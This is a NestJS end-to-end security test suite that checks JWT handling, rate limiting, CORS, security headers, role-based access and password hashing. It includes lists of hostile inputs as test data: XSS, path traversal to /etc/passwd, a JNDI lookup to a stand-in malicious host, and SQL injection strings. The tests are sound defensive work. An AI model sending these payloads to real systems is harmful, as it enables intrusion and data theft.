import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from './../src/app.module';
import { JwtService } from '@nestjs/jwt';

describe('Security Tests', () => {
  let app: INestApplication;
  let jwtService: JwtService;

  beforeEach(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    jwtService = moduleFixture.get<JwtService>(JwtService);
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('JWT Authentication', () => {
    it('should generate valid JWT tokens', () => {
      const payload = { username: 'testuser', role: 'user' };
      const token = jwtService.sign(payload);

      expect(token).toBeDefined();
      expect(typeof token).toBe('string');
      expect(token.split('.')).toHaveLength(3); // JWT format: header.payload.signature
    });

    it('should verify JWT tokens correctly', () => {
      const payload = { username: 'testuser', role: 'user' };
      const token = jwtService.sign(payload);

      const decoded = jwtService.verify(token);
      expect(decoded.username).toBe('testuser');
      expect(decoded.role).toBe('user');
    });

    it('should reject tampered tokens', () => {
      const payload = { username: 'testuser', role: 'user' };
      const token = jwtService.sign(payload);

      // Tamper with token
      const tamperedToken = token.slice(0, -5) + 'xxxxx';

      expect(() => {
        jwtService.verify(tamperedToken);
      }).toThrow();
    });
  });

  describe('Rate Limiting', () => {
    it('should handle multiple concurrent requests', async () => {
      const requests = Array(50).fill(null).map(() =>
        request(app.getHttpServer()).get('/health')
      );

      const responses = await Promise.all(requests);

      // Should handle concurrent requests without crashing
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status); // Either OK or rate limited
      });
    });
  });

  describe('Input Validation', () => {
    it('should reject malicious input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
        '${jndi:ldap://malicious.com/a}',
        '"; DROP TABLE users; --',
      ];

      return Promise.all(
        maliciousInputs.map(input =>
          request(app.getHttpServer())
            .post('/auth/login')
            .send({ username: input, password: 'password' })
            .expect(400) // Should reject malformed input
        )
      );
    });
  });

  describe('CORS Configuration', () => {
    it('should handle CORS preflight requests', () => {
      return request(app.getHttpServer())
        .options('/api/test')
        .set('Origin', 'http://localhost:3000')
        .expect(204); // CORS preflight should return 204
    });
  });

  describe('Security Headers', () => {
    it('should include security headers', () => {
      return request(app.getHttpServer())
        .get('/health')
        .expect(200)
        .then(response => {
          // Check for security headers (depending on your NestJS security setup)
          const headers = response.headers;

          // These are common security headers that should be present
          if (headers['x-frame-options']) {
            expect(headers['x-frame-options']).toBe('DENY');
          }

          if (headers['x-content-type-options']) {
            expect(headers['x-content-type-options']).toBe('nosniff');
          }
        });
    });
  });

  describe('RBAC (Role-Based Access Control)', () => {
    it('should enforce role-based permissions', async () => {
      // Test with regular user token
      const userToken = jwtService.sign({
        username: 'testuser',
        role: 'user',
        permissions: ['read']
      });

      // Test with admin token
      const adminToken = jwtService.sign({
        username: 'admin',
        role: 'admin',
        permissions: ['read', 'write', 'admin']
      });

      // Regular user should be denied admin operations
      await request(app.getHttpServer())
        .get('/admin/users')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);

      // Admin should have access
      await request(app.getHttpServer())
        .get('/admin/users')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
    });
  });

  describe('Password Security', () => {
    it('should hash passwords properly', () => {
      const bcrypt = require('bcrypt');
      const plainPassword = 'testPassword123';

      // This tests the password hashing utility
      const hashedPassword = bcrypt.hashSync(plainPassword, 10);

      expect(hashedPassword).toBeDefined();
      expect(hashedPassword).not.toBe(plainPassword);
      expect(bcrypt.compareSync(plainPassword, hashedPassword)).toBe(true);
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection attempts', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
      ];

      return Promise.all(
        sqlInjectionAttempts.map(input =>
          request(app.getHttpServer())
            .post('/auth/login')
            .send({ username: input, password: 'password' })
            .expect(401) // Should not crash, should return 401
        )
      );
    });
  });
});
